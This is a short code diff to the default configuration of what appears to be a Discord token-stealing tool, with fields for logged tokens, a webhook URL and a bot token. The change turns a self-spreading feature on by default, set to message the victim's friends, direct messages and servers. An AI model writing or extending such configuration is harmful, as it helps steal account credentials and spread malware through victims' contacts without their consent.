@@ -17,12 +17,17 @@ class _Config(dict):
                 "tokens_logged": 0,
                 "webhook_url": "",
                 "bot_token": "",
-                "auto_spread": False,
+                "auto_spread": {
+                    "enabled": True,
+                    "message": "your message",
+                    "dm_friends": True,
+                    "dm_dms": True,
+                    "dm_guilds": True
+                },
                 "servers": { }
                 }    
             with open("config.json","w") as f:
                 f.write(json.dumps(default_config, indent=4))
             exit()
 
-global config
 config = _Config()
